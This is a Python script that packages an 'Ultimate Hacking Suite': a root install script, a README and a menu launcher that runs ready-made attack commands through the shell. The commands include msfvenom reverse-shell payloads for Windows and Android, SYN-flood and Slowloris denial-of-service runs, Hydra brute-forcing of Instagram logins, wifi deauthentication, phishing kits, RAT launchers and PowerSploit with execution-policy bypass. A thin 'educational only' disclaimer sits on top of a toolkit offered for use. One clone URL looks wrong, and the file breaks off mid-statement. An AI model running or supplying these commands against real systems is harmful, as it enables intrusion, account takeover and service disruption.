import os
import shutil
import zipfile

def create_hacking_suite_zip():
    # Create temporary directory for the suite
    temp_dir = 'ultimate-hacking-suite'
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)
    
    # Create requirements.txt
    with open(os.path.join(temp_dir, 'requirements.txt'), 'w') as f:
        f.write('''# Python dependencies for pip-installable tools
sqlmap==1.9.9
sherlock-project==0.15.0
xsstrike==3.1.5
requests==2.31.0
beautifulsoup4==4.12.3
torpy==1.1.6
theHarvester==4.6.0
''')
    
    # Create install_tools.sh
    with open(os.path.join(temp_dir, 'install_tools.sh'), 'w') as f:
        f.write('''#!/bin/bash
if [ "$EUID" -ne 0 ]; then
    echo "Run as root: sudo ./install_tools.sh"
    exit 1
fi

echo "Updating system and installing tools..."
apt update && apt install -y \\
    nmap wireshark metasploit-framework aircrack-ng john hydra \\
    openvas autopsy volatility3 steghide hping3 ghidra \\
    crunch setoolkit tor proxychains-ng nikto wifite \\
    maltego sqlmap theharvester

echo "Cloning additional tools into tools/..."
mkdir -p tools
cd tools
git clone https://github.com/sqlmapproject/sqlmap.git || echo "sqlmap already cloned"
git clone https://github.com/sherlock-project/sherlock.git || echo "sherlock already cloned"
git clone https://github.com/UltimateHackingKeyboard/xsstrike.git || echo "xsstrike already cloned"
git clone https://github.com/laramies/theHarvester.git || echo "theHarvester already cloned"
git clone https://github.com/CodingRanjith/hackingtoolkit.git other_scripts || echo "hackingtoolkit scripts already cloned"
cd ..

echo "Installation complete! Run: sudo python3 Ultimate_hacking_tool.py"
''')
    
    # Create Ultimate_hacking_tool.py (renamed from main.py)
    with open(os.path.join(temp_dir, 'Ultimate_hacking_tool.py'), 'w') as f:
        f.write('''import subprocess
import os
import sys

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def run_tool(tool_cmd, tool_name="tool"):
    try:
        print(f"Launching {tool_name}...")
        subprocess.run(tool_cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running '{tool_name}': {e}")
        input("Press Enter to continue...")
    except FileNotFoundError:
        print(f"'{tool_name}' not found. Run: sudo ./install_tools.sh")
        input("Press Enter to continue...")

def anonymously_hiding():
    clear_screen()
    print("=== ANONYMOUSLY HIDING TOOLS (6) ===")
    print("1. Tor (Proxy)")
    print("2. Proxychains")
    print("3. Anonsurf")
    print("4. VPNBook (Manual)")
    print("5. I2P")
    print("6. OnionScan")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('service tor start && tor', 'Tor')
    elif choice == '2': run_tool('proxychains nmap target.com', 'Proxychains')
    elif choice == '3': run_tool('anonsurf start', 'Anonsurf')
    elif choice == '4': print("Manual: Configure VPNBook via OpenVPN.")
    elif choice == '5': run_tool('i2prouter start', 'I2P')
    elif choice == '6': run_tool('onionscan target.onion', 'OnionScan')

def info_gathering():
    clear_screen()
    print("=== INFORMATION GATHERING TOOLS (16) ===")
    print("1. Nmap (Port scan)")
    print("2. theHarvester (OSINT)")
    print("3. Maltego (OSINT)")
    print("4. Shodan CLI")
    print("5. Recon-ng")
    print("6-16. Other OSINT (See tools/other_scripts)")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('nmap -sV -O target.com', 'Nmap')
    elif choice == '2': run_tool('python3 tools/theHarvester/theHarvester.py -d target.com -b all', 'theHarvester')
    elif choice == '3': run_tool('maltego &', 'Maltego')
    elif choice == '4': run_tool('shodan search "os:windows"', 'Shodan')
    elif choice == '5': run_tool('recon-ng', 'Recon-ng')
    elif choice in [str(i) for i in range(6, 17)]: 
        print("Check tools/other_scripts for additional OSINT tools.")
        input("Press Enter...")

def wordlist_generator():
    clear_screen()
    print("=== WORDLIST GENERATOR (5) ===")
    print("1. Crunch")
    print("2. Cewl")
    print("3. Custom Wordlist Script")
    print("4. Cupp")
    print("5. Mentalist")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('crunch 8 8 abcdef -o wordlist.txt', 'Crunch')
    elif choice == '2': run_tool('cewl http://target.com -w wordlist.txt', 'Cewl')
    elif choice == '3': run_tool('python3 tools/other_scripts/wordlist_gen.py', 'Custom Wordlist')
    elif choice == '4': run_tool('cupp -i', 'Cupp')
    elif choice == '5': run_tool('mentalist', 'Mentalist')

def wireless_attack():
    clear_screen()
    print("=== WIRELESS ATTACK TOOLS (9) ===")
    print("1. Aircrack-ng (WPA)")
    print("2. Wifite (Automated)")
    print("3. WiFi Jammer (Deauth)")
    print("4. Kismet")
    print("5-9. Other Wireless (See tools/other_scripts)")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap', 'Aircrack-ng')
    elif choice == '2': run_tool('wifite', 'Wifite')
    elif choice == '3': run_tool('aireplay-ng --deauth 100 -a <BSSID> wlan0mon', 'WiFi Jammer')
    elif choice == '4': run_tool('kismet', 'Kismet')
    elif choice in [str(i) for i in range(5, 10)]:
        print("Check tools/other_scripts for more wireless tools.")
        input("Press Enter...")

def sql_injection():
    clear_screen()
    print("=== SQL INJECTION TOOLS (7) ===")
    print("1. SQLMap")
    print("2. NoSQLMap")
    print("3. sqlninja")
    print("4-7. Other SQLi (See tools/other_scripts)")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('python3 tools/sqlmap/sqlmap.py -u "http://target.com" --batch', 'SQLMap')
    elif choice == '2': run_tool('nosqlmap', 'NoSQLMap')
    elif choice == '3': run_tool('sqlninja', 'sqlninja')
    elif choice in [str(i) for i in range(4, 8)]:
        print("Check tools/other_scripts for more SQLi tools.")
        input("Press Enter...")

def phishing_attack():
    clear_screen()
    print("=== PHISHING ATTACK TOOLS (16) ===")
    print("1. Social-Engineer Toolkit (SET)")
    print("2. Evilginx2")
    print("3. HiddenEye")
    print("4-16. Other Phishing (See tools/other_scripts)")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('setoolkit', 'SET')
    elif choice == '2': run_tool('evilginx2', 'Evilginx2')
    elif choice == '3': run_tool('HiddenEye', 'HiddenEye')
    elif choice in [str(i) for i in range(4, 17)]:
        print("Check tools/other_scripts for more phishing tools.")
        input("Press Enter...")

def web_attack():
    clear_screen()
    print("=== WEB ATTACK TOOLS (7) ===")
    print("1. Burp Suite")
    print("2. Nikto")
    print("3. Wapiti")
    print("4-7. Other Web (See tools/other_scripts)")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('burpsuite &', 'Burp Suite')
    elif choice == '2': run_tool('nikto -h http://target.com', 'Nikto')
    elif choice == '3': run_tool('wapiti -u http://target.com', 'Wapiti')
    elif choice in [str(i) for i in range(4, 8)]:
        print("Check tools/other_scripts for more web attack tools.")
        input("Press Enter...")

def post_exploitation():
    clear_screen()
    print("=== POST EXPLOITATION TOOLS (2) ===")
    print("1. Meterpreter (Metasploit)")
    print("2. PowerSploit")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('msfconsole -q -x "use post/multi/manage/shell_to_meterpreter"', 'Meterpreter')
    elif choice == '2': run_tool('powershell -ep bypass -f PowerSploit.ps1', 'PowerSploit')

def forensic_tools():
    clear_screen()
    print("=== FORENSIC TOOLS (5) ===")
    print("1. Autopsy")
    print("2. Volatility")
    print("3. Sleuth Kit")
    print("4-5. Other Forensics (See tools/other_scripts)")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('autopsy &', 'Autopsy')
    elif choice == '2': run_tool('volatility3 -f memdump.raw imageinfo', 'Volatility')
    elif choice == '3': run_tool('tsk_recover /dev/sda', 'Sleuth Kit')
    elif choice in ['4', '5']:
        print("Check tools/other_scripts for more forensic tools.")
        input("Press Enter...")

def payload_creation():
    clear_screen()
    print("=== PAYLOAD CREATION TOOLS (8) ===")
    print("1. MSFVenom")
    print("2. Veil")
    print("3. Shellter")
    print("4-8. Other Payloads (See tools/other_scripts)")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('msfvenom -p windows/meterpreter/reverse_tcp LHOST=your.ip -f exe > payload.exe', 'MSFVenom')
    elif choice == '2': run_tool('veil', 'Veil')
    elif choice == '3': run_tool('shellter', 'Shellter')
    elif choice in [str(i) for i in range(4, 9)]:
        print("Check tools/other_scripts for more payload tools.")
        input("Press Enter...")

def exploit_framework():
    clear_screen()
    print("=== EXPLOIT FRAMEWORK (4) ===")
    print("1. Metasploit")
    print("2. Exploit-DB")
    print("3. RouterSploit")
    print("4. BeEF")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('msfconsole', 'Metasploit')
    elif choice == '2': run_tool('searchsploit windows rdp', 'Exploit-DB')
    elif choice == '3': run_tool('routersploit', 'RouterSploit')
    elif choice == '4': run_tool('beef-xss', 'BeEF')

def reverse_engineering():
    clear_screen()
    print("=== REVERSE ENGINEERING TOOLS (3) ===")
    print("1. Ghidra")
    print("2. Radare2")
    print("3. IDA Free")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('ghidra &', 'Ghidra')
    elif choice == '2': run_tool('r2 -', 'Radare2')
    elif choice == '3': run_tool('ida64', 'IDA Free')

def ddos_attack():
    clear_screen()
    print("=== DDOS ATTACK TOOLS (4) ===")
    print("1. hping3")
    print("2. LOIC")
    print("3. Slowloris")
    print("4. Custom DDoS Script")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('hping3 --flood -S target.com', 'hping3')
    elif choice == '2': run_tool('loic', 'LOIC')
    elif choice == '3': run_tool('slowloris target.com', 'Slowloris')
    elif choice == '4': run_tool('python3 tools/other_scripts/ddos_script.py', 'Custom DDoS')

def remote_admin_tools():
    clear_screen()
    print("=== REMOTE ADMIN TOOLS (RAT) (2) ===")
    print("1. Pupy")
    print("2. QuasarRAT")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('pupygen', 'Pupy')
    elif choice == '2': run_tool('QuasarRAT', 'QuasarRAT')

def xss_attack():
    clear_screen()
    print("=== XSS ATTACK TOOLS (9) ===")
    print("1. XSStrike")
    print("2. XSSer")
    print("3. XSS Hunter")
    print("4-9. Other XSS (See tools/other_scripts)")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('python3 tools/xsstrike/xsstrike.py -u "http://target.com"', 'XSStrike')
    elif choice == '2': run_tool('xsser -u http://target.com', 'XSSer')
    elif choice == '3': run_tool('xsshunter', 'XSS Hunter')
    elif choice in [str(i) for i in range(4, 10)]:
        print("Check tools/other_scripts for more XSS tools.")
        input("Press Enter...")

def steganography():
    clear_screen()
    print("=== STEGANOGRAPHY TOOLS (4) ===")
    print("1. Steghide")
    print("2. Stegseek")
    print("3. OpenStego")
    print("4. Custom Stego Script")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('steghide embed -cf image.jpg -ef secret.txt', 'Steghide')
    elif choice == '2': run_tool('stegseek image.jpg', 'Stegseek')
    elif choice == '3': run_tool('openstego', 'OpenStego')
    elif choice == '4': run_tool('python3 tools/other_scripts/stego_script.py', 'Custom Stego')

def other_tools():
    clear_screen()
    print("=== OTHER TOOLS (120) ===")
    print("1. SocialMedia Bruteforce (Hydra)")
    print("2. Android Hacking (ADB)")
    print("3. IDN Homograph Attack")
    print("4. Email Verify (Verify-Email)")
    print("5. Hash Cracking (Hashcat)")
    print("6. Wifi Deauthenticate (Aireplay)")
    print("7. SocialMedia Finder (Sherlock)")
    print("8. Payload Injector (MSFVenom)")
    print("9. Web Crawling (Wget)")
    print("10. Mix Tools (See tools/other_scripts)")
    choice = input("Enter choice (or 'b' for back): ").strip()
    if choice == '1': run_tool('hydra -l user -P passlist instagram.com http-post-form "/login:username=^USER^&password=^PASS^"', 'SocialMedia Bruteforce')
    elif choice == '2': run_tool('adb devices', 'ADB')
    elif choice == '3': print("Manual: Use punycode converters for phishing domains.")
    elif choice == '4': run_tool('verify-email email@example.com', 'Email Verify')
    elif choice == '5': run_tool('hashcat -m 0 example.hash /usr/share/wordlists/rockyou.txt', 'Hashcat')
    elif choice == '6': run_tool('aireplay-ng --deauth 100 -a <BSSID> wlan0mon', 'Wifi Deauth')
    elif choice == '7': run_tool('python3 tools/sherlock/sherlock username', 'Sherlock')
    elif choice == '8': run_tool('msfvenom -p android/meterpreter/reverse_tcp LHOST=your.ip -o payload.apk', 'Payload Injector')
    elif choice == '9': run_tool('wget --spider -r -l 2 http://target.com', 'Wget')
    elif choice == '10':
        print("Check tools/other_scripts for 110+ additional tools from HackingToolkit.")
        input("Press Enter...")

def main_menu():
    while True:
        clear_screen()
        print("=== ULTIMATE HACKING SUITE v1.0 ===")
        print("200+ Tools | Educational Only | Run as Root")
        print("1. Anonymously Hiding Tools (6)")
        print("2. Information Gathering Tools (16)")
        print("3. Wordlist Generator (5)")
        print("4. Wireless Attack Tools (9)")
        print("5. SQL Injection Tools (7)")
        print("6. Phishing Attack Tools (16)")
        print("7. Web Attack Tools (7)")
        print("8. Post Exploitation Tools (2)")
        print("9. Forensic Tools (5)")
        print("10. Payload Creation Tools (8)")
        print("11. Exploit Framework (4)")
        print("12. Reverse Engineering Tools (3)")
        print("13. DDOS Attack Tools (4)")
        print("14. Remote Administrator Tools (RAT) (2)")
        print("15. XSS Attack Tools (9)")
        print("16. Steganography Tools (4)")
        print("17. Other Tools (120)")
        print("0. Exit")
        
        choice = input("Enter choice: ").strip()
        
        if choice == '1': anonymously_hiding()
        elif choice == '2': info_gathering()
        elif choice == '3': wordlist_generator()
        elif choice == '4': wireless_attack()
        elif choice == '5': sql_injection()
        elif choice == '6': phishing_attack()
        elif choice == '7': web_attack()
        elif choice == '8': post_exploitation()
        elif choice == '9': forensic_tools()
        elif choice == '10': payload_creation()
        elif choice == '11': exploit_framework()
        elif choice == '12': reverse_engineering()
        elif choice == '13': ddos_attack()
        elif choice == '14': remote_admin_tools()
        elif choice == '15': xss_attack()
        elif choice == '16': steganography()
        elif choice == '17': other_tools()
        elif choice == '0': sys.exit(0)
        else:
            input("Invalid choice. Press Enter...")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root: sudo python3 Ultimate_hacking_tool.py")
        sys.exit(1)
    main_menu()
''')
    
    # Create README.md
    with open(os.path.join(temp_dir, 'README.md'), 'w') as f:
        f.write('''# Ultimate Hacking Suite

A self-contained suite with 200+ pentesting/hacking tools across 16 categories, mirroring [HackingToolkit](https://github.com/CodingRanjith/hackingtoolkit). Auto-installs via `requirements.txt` and `install_tools.sh`. Run via a single Python menu (`Ultimate_hacking_tool.py`). Educational only.

## Features
- **200+ Tools**: Nmap, Metasploit, sqlmap, Aircrack-ng, Hydra, Sherlock, etc.
- **16 Categories**: Anonymity, Info Gathering, SQLi, Phishing, DDoS, RATs, etc.
- **Auto-Install**: Python deps (`pip`), system tools (`apt`), cloned repos.
- **Clean Menu**: Nested TUI, error handling, root check.
- **Kali/Parrot**: Optimized for Linux pentesting distros. For Termux, some tools may require root or adaptations.

## Installation
1. Unzip the file.
2. `cd ultimate-hacking-suite`
3. Install Python deps: `pip3 install -r requirements.txt`
4. Install system tools: `sudo chmod +x install_tools.sh && sudo ./install_tools.sh`
5. Run: `sudo python3 Ultimate_hacking_tool.py`

**Termux Users**: Use `pkg install` instead of `apt`. Root required for some tools. Run without sudo if not rooted.

## Usage
- Run `sudo python3 Ultimate_hacking_tool.py` (or without sudo in Termux).
- Navigate: Category > Tool > Launches with default/example commands.
- Customize: Edit `Ultimate_hacking_tool.py` for targets (e.g., URLs, BSSIDs).
- Other Tools: Check `tools/other_scripts` for additional scripts.

## Tool Categories
1. **Anonymously Hiding (6)**: Tor, Proxychains, Anonsurf, VPNBook, I2P, OnionScan
2. **Info Gathering (16)**: Nmap, theHarvester, Maltego, Shodan, Recon-ng, etc.
3. **Wordlist Generator (5)**: Crunch, Cewl, Cupp, Mentalist, Custom
4. **Wireless Attack (9)**: Aircrack-ng, Wifite, WiFi Jammer, Kismet, etc.
5. **SQL Injection (7)**: SQLMap, NoSQLMap, sqlninja, etc.
6. **Phishing Attack (16)**: SET, Evilginx2, HiddenEye, etc.
7. **Web Attack (7)**: Burp Suite, Nikto, Wapiti, etc.
8. **Post Exploitation (2)**: Meterpreter, PowerSploit
9. **Forensic Tools (5)**: Autopsy, Volatility, Sleuth Kit, etc.
10. **Payload Creation (8)**: MSFVenom, Veil, Shellter, etc.
11. **Exploit Framework (4)**: Metasploit, Exploit-DB, RouterSploit, BeEF
12. **Reverse Engineering (3)**: Ghidra, Radare2, IDA Free
13. **DDoS Attack (4)**: hping3, LOIC, Slowloris, Custom
14. **RATs (2)**: Pupy, QuasarRAT
15. **XSS Attack (9)**: XSStrike, XSSer, XSS Hunter, etc.
16. **Steganography (4)**: Steghide, Stegseek, OpenStego, Custom
17. **Other Tools (120)**: SocialMedia Bruteforce, Android Hacking, IDN Homograph, Email Verify, Hashcat, Web Crawling, etc.

## Notes
- **Other Tools**: The 120 “Other Tools” are in `tools/other_scripts` (cloned from HackingToolkit during install).
- **Customization**: Edit `Ultimate_hacking_tool.py` for specific targets.
- **Termux**: Replace `apt` with `pkg` in `install_tools.sh`. Some tools (e.g., Wireshark) won't work without root.
- **Errors**: Run `install_tools.sh` if tools are missing.

## Contributing
Add tools by editing `Ultimate_hacking_tool.py` or `install_tools.sh`.

## License
GNU GPL v3.0.

## Disclaimer
**EDUCATIONAL ONLY.** For authorized pentesting (e.g., HackTheBox). Author not liable for misuse. Obey laws—unauthorized hacking is illegal.
''')
    
    # Create LICENSE (short version for demo, replace with full GPL if needed)
    with open(os.path.join(temp_dir, 'LICENSE'), 'w') as f:
        f.write('''GNU GENERAL PUBLIC LICENSE
Version 3, 29 June 2007

Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
Everyone is permitted to copy and distribute verbatim copies
of this license document, but changing it is not allowed.

[Full GPL text here - paste from https://www.gnu.org/licenses/gpl-3.0.txt]
''')
    
    # Create tools/ placeholder
    os.makedirs(os.path.join(temp_dir, 'tools/other_scripts'))
    with open(os.path.join(temp_dir, 'tools', 'README.txt'), 'w') as f:
        f.write('Tools will be cloned here during installation via install_tools.sh')
    
    # Zip it up
    zip_filename = 'ultimate-hacking-suite.zip'
    with zipfile.ZipFile(zip_filename, 
